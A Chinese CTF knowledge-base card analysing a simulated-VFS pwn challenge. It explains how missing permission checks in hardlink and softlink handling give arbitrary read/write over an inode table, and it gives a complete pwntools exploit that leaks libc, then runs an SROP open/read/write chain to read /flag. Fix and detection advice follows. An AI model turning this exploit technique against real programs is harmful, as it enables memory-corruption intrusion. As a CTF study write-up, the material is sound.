---
id: ctf-pwn-vfs-inode-link-permission-srop-orw
title: VFS 模拟 inode 软链接权限漏洞：任意读写 + SROP ORW
type: scenario
domain: ctf
path: ctf/pwn
technique: vfs-inode-link-permission-arbitrary-rw-srop
tags:
- pwn
- ctf
- vfs
- inode
- hardlink
- softlink
- srop
- orw
- seccomp
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T20:08:03+08:00'
  notes: V91 指出的表述/通道问题已修正：91915（seccomp 实际放行全部 syscall / WaitForSingleObject 条件方向 / %p 泄露走进程 stderr）
url: /docs/ctf/pwn/ctf-pwn-vfs-inode-link-permission-srop-orw/
draft: false
kb_aliases:
- VFS inode 权限绕过
- hardlink softlink LNKPTR
- VFS 任意读写
- SROP ORW
- NCTF VFS
- inode 表任意地址读写
---

## 一句话结论

题目是一个基于栈上 inode 表的 VFS 模拟器：`HARDLINK` 只检查源 inode 的 `type == 0`、不调用 `inode_accessible()`，因此可以把受保护的 `/dev/stack_core`（`perm=1`，内容是指向 inode 表的 `LNKPTR` blob）克隆成 hardlink；再对 hardlink 做 `SOFTLINK` 时，代码因为 `src_inode->type == 1` 跳过 `perm` 复制，新软链接保持 `memset(0)` 后的 `perm=0`，却继承了 blob 的 `ptr=state->inodes` 和 `size=0x550`，从而获得对整张 inode 表的任意读写；改一个 inode 的 `ptr/size` 即可读写任意地址，泄露 libc/栈后布置 SROP 链；程序虽安装了 seccomp 过滤器，但其 0009 规则为 no-op、0010 直接 return ALLOW，实际放行全部 syscall（含 rt_sigreturn），因此可用 SROP 做 ORW 读 flag。

## 原理

- **VFS 结构**：`vfs_state_t` 里有 inode 表（每项 0x28：name[16]、used、perm、type、size、ptr；原文截图解析了前 8 项，state 的 inodes 区为 0x550，可按步长遍历）和 0x800 的 disk。`init_system_files()` 建立 `user_readme`（type 0、perm 0）和 `/dev/stack_core`（type 0、perm 1、size 24、ptr 指向 state 自身）；state 开头是一个 `link_blob_t`：`ptr = state->inodes`、`size = 0x550`、`perm = 1`、`magic = "LNKPTR"`。`/dev/stack_core` 实际是“装着 inode 表地址的特殊文件”。
- **Hardlink 的权限缺口**：`cmd_hardlink` 找到 src 后只检查 `src_inode->type == 0`，没有调用 `inode_accessible()`；它把 `src_inode->ptr` 的 `size` 字节复制到 disk 新位置，创建 `type=1`、`perm=src_inode->perm` 的 hardlink。于是 `/dev/stack_core` 被克隆成 `HK`（type 1、perm 1），disk 中的副本仍是 `LNKPTR` blob。
- **Softlink 的类型混淆**：`cmd_softlink` 要求 src 不是 type 2、size > 23、内容以 `LNKPTR` 开头；然后 `dst->type=2`、`dst->size=blob->size`、`dst->ptr=blob->ptr`。关键代码：
  ```c
  if ( src_inode->type != 1 )
      dst_inode->perm = blob->perm;
  ```
  对 hardlink（`src_inode->type == 1`）不复制 `blob->perm=1`；而 `dst_inode` 刚被 `memset(0)`，于是软链接 `LK` 的 `perm=0`（用户可访问）、`ptr=state->inodes`、`size=0x550`——既可以读整张 inode 表，也可以写。
- **任意读写**：`READ/WRITE` 都先 `inode_accessible(inode)` 检查 `perm`，再按 `inode->size >= len` 和 `inode->ptr` 读写。用 `LK` 读出 inode 表，找到 `AA` 的索引和 `state`/`inodes` 的栈地址；之后修改 `AA` 的 `ptr/size` 为目标地址/长度，`READ AA`/`WRITE AA` 就是任意地址读写。
- **泄露**：`AA` 指向 `write@GOT` 读出 libc 地址；inode 表本身在栈上，`/dev/stack_core` 的 `ptr` 就是 `state` 地址，可直接得到栈基址；`vfs_sandbox()` 保存返回地址的位置相对 `state` 固定（原文 `stack_base + 0xdf8`）。
- **SROP ORW**：seccomp 过滤器实际未限制 syscall（0009 no-op、0010 ALLOW），`rt_sigreturn` 可用，NX 开启；用任意写把 `pop rax; ret`、`syscall`、三个 `SigreturnFrame`（open(`/flag`)、read(3, buf)、write(0/1, buf)）写到栈上的返回地址处，`QUIT` 让 `menu_loop` 返回触发 `rt_sigreturn`，依次执行 ORW。
- **CET 说明**：题目 checksec 显示 SHSTK/IBT enabled，但远端/仿真环境未实际启用或 exp 仍可完成；真实 CET 会限制 ROP/SROP 的间接跳转，需要先绕过。

## 触发条件

- 目标为 VFS 模拟器，提供 `HARDLINK`/`SOFTLINK`/`READ`/`WRITE`/`TOUCH`/`LIST`/`QUIT` 命令；inode 表与 disk 在可预测的栈/全局布局。
- 漏洞版本：hardlink 不检查 `inode_accessible`、softlink 对 `type == 1` 跳过 `perm` 复制（如原文 NCTF2026 VFS）。
- 程序 Partial RELRO、No canary、No PIE、NX；seccomp 放行全部 syscall（包含 rt_sigreturn）；有可写返回地址/栈空间。
- 已知或可泄露 libc 基址（write@GOT）与栈/inode 表地址；能通过 `READ/WRITE` 触发任意读写。
- SROP 需要 `rt_sigreturn` 系统调用可用（seccomp 允许或未过滤）；栈空间足够放多个 frame。

## 利用步骤

1. 先执行 `HARDLINK /dev/stack_core HK`、`SOFTLINK HK LK`、`TOUCH AA`。`HK` 是 hardlink（type 1），`LK` 是 perm=0 的软链接，指向 inode 表。
2. `READ LK 0x550` 读出 inode 表；解析每项 0x28 字节，找到 `/dev/stack_core` 项的 `ptr` 作为 `stack_base`（state 地址），找到 `AA` 的索引 `aa_idx`。
3. 实现任意读：修改 `AA` 项的 `ptr=目标地址`、`size=长度`，`READ AA len`；任意写同理 `WRITE AA data`（每次 ≤0x400，可分段）。
4. `arb_read(write@GOT, 8)` 得到 libc 地址，计算 `system`/`/bin/sh`/gadget；`arb_write` 把 `/flag\x00` 写到 `stack_base+0x300`、read 缓冲写到 `stack_base+0x500`。
5. 在 `stack_base+0xdf8`（`vfs_sandbox` 保存的返回地址）布置 SROP 链：`pop rax; ret` + `SYS_rt_sigreturn` + `syscall` + frame1（open `/flag`，rsp 指向 frame2）、frame2（read fd=3）、frame3（write fd=0/1）。
6. `QUIT` 触发 `menu_loop` 返回，`rt_sigreturn` 恢复 frame1 的上下文执行 open；frame1 的 `rsp` 指向 frame2，依次 read/write，输出 flag。
7. 若失败，用 GDB 检查 `stack_base+0xdf8` 是否真的是返回地址、frame 的 `rsp` 链是否连续、seccomp 是否允许 `rt_sigreturn`/open/read/write。

## PoC

```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io = process('./pwn', stdin=PTY, stdout=PTY)

def cmd(c):
    io.sendline(c)
    return io.recvuntil(b'vfs> ')

def rd(name, n):
    io.sendline(b'READ ' + name + b' ' + str(n).encode())
    io.recvuntil(b'DATA ' + str(n).encode() + b'\n')
    data = io.recvn(n)
    io.recvuntil(b'vfs> ')
    return data

def wr(name, data):
    io.sendline(b'WRITE ' + name + b' ' + str(len(data)).encode())
    io.recvuntil(b'READY\n')
    io.send(data)
    io.recvuntil(b'OK\nvfs> ')

def pack_inode(name, used, perm, typ, size, ptr):
    return pack('<16sIIIIQ', name.ljust(0x10, b'\0')[:0x10], used, perm, typ, size, ptr)

# bootstrap
for c in [b'HARDLINK /dev/stack_core HK', b'SOFTLINK HK LK', b'TOUCH AA']:
    assert cmd(c) == b'OK\nvfs> '

leak = rd(b'LK', 0x550)
inodes = [unpack('<16sIIIIQ', leak[i*0x28:(i+1)*0x28]) for i in range(8)]
stack_base = next(x[5] for x in inodes if x[0].split(b'\0')[0] == b'/dev/stack_core')
aa_idx = next(i for i, x in enumerate(inodes) if x[0].split(b'\0')[0] == b'AA')
cur_tbl = bytearray(leak[:0x400])

def patch_A(ptr, size, typ=0):
    off = aa_idx * 0x28
    cur_tbl[off:off+0x28] = pack_inode(b'AA', 1, 0, typ, size, ptr)
    wr(b'LK', bytes(cur_tbl))

def arb_read(addr, n):
    patch_A(addr, max(n, 1))
    return rd(b'AA', n)

def arb_write(addr, data):
    for off in range(0, len(data), 0x400):
        chunk = data[off:off+0x400]
        patch_A(addr + off, max(len(chunk), 1))
        wr(b'AA', chunk)

write_leak = u64(arb_read(elf.got['write'], 8))
libc.address = write_leak - libc.sym['write']
rop = ROP(libc)
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address

path_addr = stack_base + 0x300
buf_addr = stack_base + 0x500
arb_write(path_addr, b'/flag\x00')

ret_addr = stack_base + 0xdf8
frame1 = SigreturnFrame(kernel='amd64')
frame1.rax, frame1.rdi, frame1.rsi, frame1.rdx = constants.SYS_open, path_addr, 0, 0
frame1.rip = syscall
chain2 = ret_addr + 24 + len(bytes(frame1))
frame1.rsp = chain2

frame2 = SigreturnFrame(kernel='amd64')
frame2.rax, frame2.rdi, frame2.rsi, frame2.rdx = constants.SYS_read, 3, buf_addr, 0x100
frame2.rip = syscall
chain3 = chain2 + 24 + len(bytes(frame2))
frame2.rsp = chain3

frame3 = SigreturnFrame(kernel='amd64')
frame3.rax, frame3.rdi, frame3.rsi, frame3.rdx = constants.SYS_write, 0, buf_addr, 0x100
frame3.rip = syscall
frame3.rsp = chain3 + 24 + len(bytes(frame3)) + 0x100

chain = flat(pop_rax, constants.SYS_rt_sigreturn, syscall, bytes(frame1),
             pop_rax, constants.SYS_rt_sigreturn, syscall, bytes(frame2),
             pop_rax, constants.SYS_rt_sigreturn, syscall, bytes(frame3))
arb_write(ret_addr, chain)
io.sendline(b'QUIT')
print(io.recvall().decode('latin1', errors='replace'))
```

## 变体与关联

- **变体：VFS 权限模型缺陷**：hardlink 不检查 `inode_accessible`、softlink 对 hardlink 类型跳过 `perm` 复制、`type`/`perm` 混淆；任何“模拟文件系统 + inode 表”的 CTF 题都可审计同类逻辑。
- **变体：任意读写原语**：改 inode 的 `ptr/size` 是常见思路；也可利用越界 `size`、负 `size`、`copy_name` 溢出等。
- **变体：SROP/ORW**：seccomp 未限制或允许 open/read/write/rt_sigreturn 时，SROP 是最简 ROP；若允许 `execve` 可直接 ret2libc；若禁用 `rt_sigreturn` 需换 ROP/ret2csu。
- **关联卡片**：[[binary-pwn-stack-sigaltstack-ucontext-sigreturn-hijack]]（SROP/ucontext 变体）、[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（seccomp ORW/栈迁移）、[[ctf-pwn-interpreter-serialization-expansion-heap-overflow]]（另一道 CTF 堆题）。
- **边界**：CET/SHSTK/IBT 可能阻断 SROP/ROP；seccomp 若过滤 `rt_sigreturn` 或 open 路径，需要换利用；inode 表大小/索引与原文不同需重算偏移。

## 检测与防御

- **代码修复**：hardlink/softlink 前统一调用 `inode_accessible()`；复制 `perm` 时不要因 `type` 跳过；softlink 解析 `LNKPTR` blob 时校验 `ptr/size` 指向合法范围；对 `size` 做上限与溢出检查。
- **加固**：Full RELRO + PIE + canary + CET；seccomp 限制 `rt_sigreturn`/open 路径；将 inode 表放在只读/受保护内存；对 VFS 命令做 fuzz。
- **检测**：监控 `HARDLINK /dev/stack_core`、`SOFTLINK` 链、异常大 `READ/WRITE`、inode `ptr` 指向代码/栈/GOT 的操作；进程崩溃/ROP 迹象。
- **CTF 环境**：用 GDB 检查 inode 表与 `perm` 字段，确认任意读写原语；SROP 需确认 seccomp 允许 `rt_sigreturn`。
